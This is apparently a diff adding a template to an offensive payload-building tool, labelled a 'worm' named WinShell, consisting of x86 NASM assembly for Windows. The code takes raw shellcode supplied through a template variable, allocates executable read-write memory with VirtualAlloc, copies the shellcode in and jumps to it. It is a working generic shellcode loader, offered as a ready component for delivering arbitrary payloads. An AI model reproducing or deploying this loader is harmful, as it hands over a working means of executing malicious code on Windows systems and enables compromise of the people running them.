@@ -1,0 +1,73 @@
+#!name##WinShell
+#!types##worm
+#!info##[W] [x86] Shellcode testing worm for windows. You can paste your shellcode to test it or use a ready-made one.
+#!processWorm##BasicAsm
+#!reqVar##scode##Raw Shellcode. Ex: \x23\x4c\x56 ##str
+#!globalVar##COMPILER_NO_DLL##Not include DLLs
+#!lang##asm
+#!system_FLAG##[W]
+#!banned##module##starter##shadow##junk
+    
+extern _VirtualAlloc@16
+extern _ExitProcess@4
+extern _memcpy
+extern _printf
+
+section .data    
+    shellcode: db {{scode}}
+    shellcode_len: equ $ - shellcode
+    text_error: db "ERROR: Allocate Memory", 10 ,0
+    text_done: db "Execute Shellcode. Shellcode length: ",0
+    shell_len: db "{{TOOL.shellcode_len(scode)}}", 10 ,0
+
+section .bss
+    mem_pointer: resw 1
+
+section .text
+    global _main
+    
+_main:
+    ; Virtual Alloc Memory
+    
+    push dword 0x40     ; PAGE_EXECUTE_READWRITE
+    push dword 0x00001000 | 0x00002000
+    push dword shellcode_len
+    push dword 0
+    call _VirtualAlloc@16
+
+    cmp eax, 0
+    je _ERROR_va
+
+    mov [mem_pointer], eax  ; save memory addr
+    
+    ; memcpy
+    
+    push dword shellcode_len
+    push dword shellcode
+    push dword [mem_pointer]    ; destination mem addr
+    call _memcpy
+    add esp, 12     ; clean stack
+    
+
+    ; execute shellcode
+    push text_done
+    call _printf
+    add esp, 4  ; clean stack
+    push shell_len
+    call _printf
+    add esp, 4  ; clean stack
+
+    mov eax, [mem_pointer]
+    call eax
+    
+    ; exit program
+    push 0
+    call _ExitProcess@4
+    
+
+_ERROR_va:
+    push text_error
+    call _printf
+    add esp, 4  ; clean stack
+    push 0
+    call _ExitProcess@4
